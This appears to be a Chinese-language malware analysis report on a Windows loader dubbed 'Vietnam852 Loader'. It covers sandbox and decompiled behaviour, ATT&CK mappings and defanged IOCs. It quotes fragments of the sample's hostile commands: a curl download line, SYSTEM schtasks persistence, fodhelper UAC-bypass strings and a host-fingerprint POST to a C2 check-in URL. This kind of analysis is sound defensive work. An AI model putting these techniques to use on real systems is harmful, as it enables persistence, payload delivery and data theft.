---
title: "恶意样本分析：Vietnam852 Loader（PE · exe · ab6d56fb）"
published: 2026-11-21
draft: false
description: "恶意（置信度低）：Vietnam852 Loader · loader/downloader/botnet · 难度 medium · 动态沙箱 + 静态反编译"
tags: ["Vietnam852", "loader", "downloader", "botnet", "PE"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **Vietnam852 Loader**（存疑） · 置信度 **低**
> 
> 别名：vietnam852 botnet、MicrosoftEdgeUpdate masquerader
> 
> 动态沙箱内真实引爆：样本先以 --skip-elevate 自重启并把自身复制为 C:\Windows\Fonts\userinit.exe（版本信息伪装成 ClickOnce/dfsvc.exe），随后以 NT AUTHORITY\SYSTEM 身份创建 3 个计划任务；该副本解析并访问 site[.]vietnam852[.]com:88/q1.txt、经 FTP 以 abc 账号取回 down.exe、查询 api[.]ipify[.]org 获取公网 IP，最后向 ftp[.]vietnam852[.]com:88/post.php POST 2125 字节主机指纹（操作系统/CPU/内存/用户名/主机名等）。静态代码同时包含 fodhelper/ms-settings UAC 绕过与 EfsRpc*/srvsvc 横向移动字符串。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **Vietnam852 Loader** · 别名 vietnam852 botnet、MicrosoftEdgeUpdate masquerader · _存疑_ |
| 置信度 | **低** |
| 行为类 | loader · downloader · botnet |
| 难度 | medium |
| 首次出现 | 2026-11-20 00:07:21 |
| 分析方法 | 动态沙箱分析 + 静态反编译 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/ab6d56fbb84f2a0ec4907c4ce75c5d5d79181c5a4a5554e5054460f826818bf2/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="34" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">伪装ClickOnce落盘</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036.005</text>
<rect x="586" y="23" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="38" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">动态观测</text>
<circle cx="26" cy="84" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="84" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">自重启挂起提权</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1548.002</text>
<rect x="586" y="73" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="88" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">动态观测</text>
<circle cx="26" cy="134" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="134" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">建SYSTEM计划任务</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1053.005</text>
<rect x="586" y="123" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="138" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">动态观测</text>
<circle cx="26" cy="184" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="184" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">回连拉取任务列表</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<rect x="586" y="173" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="188" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">动态观测</text>
<circle cx="26" cy="234" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="234" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">FTP取回down.exe</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.002</text>
<rect x="586" y="223" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="238" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">动态观测</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `ab6d56fbb84f2a0ec4907c4ce75c5d5d79181c5a4a5554e5054460f826818bf2` |
| MD5 | _未记录_ |
| 大小 | 476,160 字节（465.0 KB） |
| 类型 | PE · `exe` |

## 行为分析

共 **10** 条行为，每条都挂了证据；其中 **3** 条静态可得、**7** 条经动态分析取得。

### 1. 伪装ClickOnce落盘

`T1036.005` · 置信度 **高** · 动态

把自身复制为 C:\Windows\Fonts\userinit.exe，并携带 dfsvc.exe / ClickOnce / .NET Framework 4.8.4084.0 的版本信息，冒用系统文件名躲避检视。

> **证据**：遥测 File created: C:\Windows\Fonts\userinit.exe，Image=样本 pid 2112；PE 资源 VS_VERSION_INFO OriginalFilename=dfsvc.exe
> 
> **来源**：`ref:d389236063` · `ev-000021`

### 2. 自重启挂起提权

`T1548.002` · 置信度 **高** · 动态

以 --skip-elevate 参数创建自身子进程完成上下文切换；主函数还包含 --no-uac 开关与 fodhelper/ms-settings COM 提权分支。

> **证据**：FUN_1400010d0 解析 --skip-elevate/--no-uac，CreateProcessA;字符串 Elevation:Administrator!new:%s + C:\Windows\System32\fodhelper.exe;遥测 pid 2112 命令行为 --skip-elevate
> 
> **来源**：`ev-000016` · `ev-000020` · `ev-000021`

### 3. 建SYSTEM计划任务

`T1053.005` · 置信度 **高** · 动态

连续执行 schtasks /create 创建伪装成 .NET Framework NGEN 的计划任务（另有 HourlyUpdate、down.exe 子任务），带 /ru SYSTEM /rl HIGHEST 以最高权限持久化。

> **证据**：遥测 Process Create: schtasks /create /tn "\Microsoft\Windows\.NET Framework\.NET Framework NGEN v3.5.30729.5420" ... /ru SYSTEM /rl HIGHEST;任务文件 CreationUtcTime 00:49:10
> 
> **来源**：`ref:d389236063` · `ev-000021` · `ev-000017` · `ev-000019`

### 4. 回连拉取任务列表

`T1071.001` · 置信度 **高** · 动态

副本以 UA=MicrosoftEdgeUpdate 访问 site[.]vietnam852[.]com:88，按内存容量阈值选择 q1.txt 或 q2.txt 拉取远程载荷 URL 清单。

> **证据**：网络日志 GET /q1.txt Host: site[.]vietnam852[.]com:88 User-Agent: MicrosoftEdgeUpdate；FUN_1400010d0 依据 FUN_140003540 返回值选择 q1/q2
> 
> **来源**：`ref:d389236063` · `ev-000021` · `ev-000016`

### 5. FTP取回down.exe

`T1071.002` · 置信度 **高** · 动态

以 abc 账号连接 ftp[.]vietnam852[.]com:21 并 RETR 载荷，将取回内容落地后执行；静态代码另含 curl -u 123:123 的备用下载链。

> **证据**：FTP 日志 USER 'abc' logged in + RETR（两次）；用户态调用链 FUN_140006700/FUN_1400050e0；字符串 ftp://ftp[.]vietnam852[.]com/down.exe 与 cmd /c curl -s -u 123:123 -o
> 
> **来源**：`ref:d389236063` · `ev-000021` · `ev-000020`

### 6. 上报主机指纹

`T1082` · 置信度 **高** · 动态

向 ftp[.]vietnam852[.]com:88/post.php POST application/x-www-form-urlencoded 数据，含 country/os/cpu/memory/install/username/hostname/domain 等主机画像字段。

> **证据**：网络日志 POST /post.php Content-Length: 2125，正文 ip=...&country=CN&os=Windows 10 22H2 Build 19045&cpu=...&memory=4095 MB&username=SYSTEM&hostname=DESKTOP-7QK4M2P&domain=；字符串 &domain= / &hostname= / &username= / &install= / &memory= / &cpu= / &country=
> 
> **来源**：`ref:d389236063` · `ev-000021` · `ev-000020`

### 7. 查询公网IP

`T1016` · 置信度 **高** · 动态

访问 api[.]ipify[.]org 获取出口公网 IP，用于面板定位与回连环境判断。

> **证据**：网络日志 GET / Host: api[.]ipify[.]org（443，UA=MicrosoftEdgeUpdate）；字符串 api[.]ipify[.]org
> 
> **来源**：`ref:d389236063` · `ev-000021` · `ev-000020`

### 8. 解析远程载荷清单

`T1105` · 置信度 **高** · 静态

逐行解析远程清单：仅接受以 http 开头的行，按 URL 末段命名 payloadN.exe 下载到本地，再调用计划任务函数把下载物注册为定时执行。

> **证据**：FUN_140005170 @0x140005170：遍历行、find(" \t")、前缀校验 "http"、拼接 "payload"+序号+".exe"、调用 FUN_140004380 生成 schtasks /sc minute /mo 30 /st 03:30 /f
> 
> **来源**：`ev-000018` · `ev-000019`

### 9. 内置SMB横向模块

`T1210` · 置信度 **中** · 静态

代码内含 EfsRpc* 系列 RPC 名称、srvsvc 命名管道、\\C$ 共享路径与 SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege 字符串，具备 EFSRPC 强制认证与令牌窃取式横向移动能力。

> **证据**：字符串 0x51310-0x515a0 EfsRpcOpenFileRaw/EfsRpcEncryptFileSrv/EfsRpcDecryptFileSrv 等、0x51670 pipe srvsvc、0x512e8 \\C$\、0x515d0 SeImpersonatePrivilege；导入 LsaAddAccountRights/CreateWellKnownSid/PrivilegeCheck
> 
> **来源**：`ev-000020` · `ev-000010`

### 10. 互斥体防多开

`T1480` · 置信度 **高** · 静态

创建 Global\MicrosoftEdgeUpdate_mutex 单实例互斥体，失败时回退 Local\ 前缀并轮询等待，避免同一主机重复驻留。

> **证据**：FUN_1400010d0: CreateMutexA("Global\"+name) → ERROR_ACCESS_DENIED 时用 "Local\"；ERROR_ALREADY_EXISTS 时 Sleep(500) 重试 20 次
> 
> **来源**：`ev-000016` · `ev-000020`


## IOC（已去武器化）

### 网络

:::note
**已动态观测到连接**：样本实际向该目标发起 TCP 连接（短时间内多次重试）。
:::

:::caution
**真实服务器侧仍未验证**：上述连接/握手是与本地受控仿真服务完成的，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://site[.]vietnam852[.]com:88/q1.txt` | 88 | download | 静态 | ⏳ 未观测 |
| http | `hxxp://site[.]vietnam852[.]com:88/q2.txt` | 88 | download | 静态 | ⏳ 未观测 |
| other | `ftp://ftp[.]vietnam852[.]com:21/down.exe` | 21 | download | 静态 | ⏳ 未观测 |
| http | `hxxp://ftp[.]vietnam852[.]com:88/post.php` | 88 | exfil | 静态 | ⏳ 未观测 |
| http | `hxxps://api[.]ipify[.]org/` | 443 | other | 动态 | 已观测 |

### 主机

**互斥体**

- `Global\MicrosoftEdgeUpdate_mutex`
- `Local\MicrosoftEdgeUpdate_mutex`

**落地路径**

- `C:\Windows\Fonts\userinit.exe`
- `%PUBLIC%\Music\Windows\`
- `%PUBLIC%\Music\upd`
- `%PUBLIC%\MicrosoftEdgeUpdate`
- `%PROGRAMDATA%\MicrosoftEdgeUpdate`

**注册表**

- `HKCU\Software\Classes\ms-settings\shell\open\command`

**计划任务**

- `\Microsoft\Windows\.NET Framework\.NET Framework NGEN v3.5.30729.5420`
- `\Microsoft\Windows\.NET Framework\.NET Framework NGEN v3.5.30729.5420 HourlyUpdate`
- `\Microsoft\Windows\.NET Framework\.NET Framework NGEN v3.5.30729.5420 down.exe`
- `MicrosoftEdgeUpdateTaskMachineCore`
- `MicrosoftEdgeUpdate`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `site[.]vietnam852[.]com, ftp[.]vietnam852[.]com` | 是 | 动态 |
| `c2_port` | `88 (HTTP), 21 (FTP), 443 (HTTPS)` | 是 | 动态 |
| `payload_list_url` | `hxxp://site[.]vietnam852[.]com:88/q1.txt \| q2.txt（按内存容量阈值二选一）` | 是 | 静态 |
| `checkin_uri` | `hxxp://ftp[.]vietnam852[.]com:88/post.php` | 是 | 动态 |
| `ftp_user` | `abc` | 是 | 动态 |
| `ftp_password_candidate` | `cba（与 abc 成对出现的候选口令，未验证）` | 否 | 静态 |
| `ftp_download_url` | `ftp://ftp[.]vietnam852[.]com/down.exe` | 是 | 静态 |
| `curl_credential` | `123:123（cmd /c curl -s -u 123:123 -o ...）` | 否 | 静态 |
| `mutex` | `Global\MicrosoftEdgeUpdate_mutex` | 是 | 动态 |
| `install_path` | `%PUBLIC%\Music\Windows\userinit.exe（动态落点为 C:\Windows\Fonts\userinit.exe）` | 是 | 动态 |
| `user_agent` | `MicrosoftEdgeUpdate` | 是 | 动态 |
| `encryption_algo` | `none observed（未发现加密配置或 C2 加密例程）` | 否 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 不可判定为勒索软件或破坏性木马：样本未表现出文件加密、卷影删除或用户数据破坏逻辑，文件操作集中在自身复制与临时清单。
- 不可断言已完成横向移动：EfsRpc/srvsvc/\\C$ 仅为静态字符串与导入证据，动态观测窗口内未捕获成功的 SMB/RPC 攻击会话。
- 不可断言已取得 q1.txt/q2.txt 的真实载荷清单：沙箱网络重定向返回的是合成响应，样本对内容解析失败后转走 FTP 链路，真实清单内容未知。
- 不可断言 ms-settings 注册表已被写入：本次样本以 SYSTEM 运行，UAC 绕过分支未触发，终端遥测中没有对应注册表事件。
- 不可把 api[.]ipify[.]org 当作 C2 或情报回传点：它只承担公网 IP 查询。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 动态沙箱分析 + 静态反编译 |
| 脱壳 | 否 |

**局限与待验证**

1. 动态窗口约 180 秒，C2 域名被网络重定向拦截，q1.txt/q2.txt 的真实任务清单与 down.exe 真实载荷未能取得。
2. 样本由引爆器以 SYSTEM 启动，提权/UAC 绕过分支未实际执行，因此 HKCU\Software\Classes\ms-settings 写入、fodhelper 调用均只有静态证据。
3. 横向移动（EfsRpc/srvsvc/令牌窃取）只完成静态识别，未在沙箱中观测到 SMB/RPC 成功利用。
4. 家族名与别名基于基础设施和伪装特征暂定，未获得厂商命名、签名或 YARA 交叉验证，故标记 uncertain。
5. 编译时间戳（2019-11-24）与 ClickOnce/.NET 资源信息可被伪造，不能作为版本或来源依据。

## 证据索引

<details>
<summary>展开 15 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ev-000001` | 哈希与指纹 | sha256/md5/sha1 与文件大小 476160 |
| `ev-000003` | scan.entropy | .text 熵 6.128，无加壳迹象 |
| `ev-000010` | 字符串提取 | 字符串抽取，含 flag 候选误报（字母表常量） |
| `ev-000013` | 字符串提取 | ASCII 2013 条 / UTF-16 536 条字符串 |
| `ev-000016` | decompile.ghidra | 主函数 FUN_1400010d0：互斥体、提权自重启、q1/q2 选择、自身复制 |
| `ev-000017` | decompile.ghidra | FUN_140003f10：schtasks /sc minute /mo 30 /st 02:30 /f [/ru SYSTEM /rl HIGHEST] |
| `ev-000018` | decompile.ghidra | FUN_140005170：远程载荷清单解析、payloadN.exe 下载与任务注册 |
| `ev-000019` | decompile.ghidra | FUN_140004380：schtasks /sc minute /mo 30 /st 03:30 /f |
| `ev-000020` | evidence.record | 静态字符串与 lea 交叉引用图谱（域名/URL/任务名/UAC/横向模块） |
| `ev-000021` | evidence.record | 动态产物解析：FTP/HTTP 会话、监控组件 进程/文件/任务时间线 |
| `ref:d389236063` | 动态分析平台 | 真实动态引爆时间线、进程/内存转储与网络日志打包（已回滚） |
| `c2_evidence:ab6d56fb` | 连接证据提取 | 动态网络监控记录到 1 次到 api[.]ipify[.]org:443 的连接尝试；未捕获完整会话 |
| `telemetry:ab6d56fb` | 动态遥测 | 动态遥测记录到：监控组件 注册表事件 1 条；监控组件 进程/文件事件 116 条；ETW 短命进程事件 2 条；已过滤工具/系统噪声 18 条 |
| `etw:ab6d56fb:632` | 进程事件监控 | 短命进程事件：ab6d56fbb84f2a0ec4907c4ce75c5d5d79181c5a4a5554e5054460f826818bf2.exe（pid 632；MD5=59C3B93AE013B0AC73748D4E9525CB99,SHA256=AB6D56FBB84F2A0EC4907C4CE75C5D5D79181C5A4A5554E5054460F826818BF2,IMPHASH=469BF8567A384F62970CFA312C635917） |
| `etw:ab6d56fb:2112` | 进程事件监控 | 短命进程事件：ab6d56fbb84f2a0ec4907c4ce75c5d5d79181c5a4a5554e5054460f826818bf2.exe（pid 2112；MD5=59C3B93AE013B0AC73748D4E9525CB99,SHA256=AB6D56FBB84F2A0EC4907C4CE75C5D5D79181C5A4A5554E5054460F826818BF2,IMPHASH=469BF8567A384F62970CFA312C635917） |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
